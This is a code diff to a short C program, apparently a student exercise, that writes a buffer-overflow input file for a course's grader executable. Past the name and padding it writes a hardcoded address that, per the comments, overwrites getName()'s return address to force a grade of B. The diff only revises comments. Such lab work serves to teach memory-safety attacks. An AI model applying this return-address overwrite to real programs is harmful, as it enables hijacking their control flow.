@@ -5,25 +5,28 @@
 #include <stdio.h>
 
 /* Prints a buffer overun string to the file dataB that causes the
-grader to give a grade B to the name Ibraheem Amin */
+grader executable to give a grade B to the name Ibraheem Amin. This
+function takes in no command line arguments, returns 0 */
 int main()
 {
     FILE *psFile;
     int i;
+    /* Address in text where B is assigned to grade. */
     unsigned long ulData = 0x400890;
     psFile = fopen("dataB", "w");
 
-    /* Name */
+    /* First 13 bytes are the name */
     fprintf(psFile, "%s", "Ibraheem Amin");
     /* Nullbyte at the end of the name */
     putc(0, psFile);
-    /* Filler nullbyte*/
+    /* Filler nullbytes */
     for (i = 0; i < 34; i++)
     {
         putc(0, psFile);
     }
-    /* address in text where B is assigned to grade */
-    fwrite(&ulData, sizeof(unsigned long), 1, psFile);
+    /* Address in text where B is assigned to grade which overwrites the
+       return address of getName() */
+    (void)fwrite(&ulData, sizeof(unsigned long), 1, psFile);
 
     fclose(psFile);
     return 0;
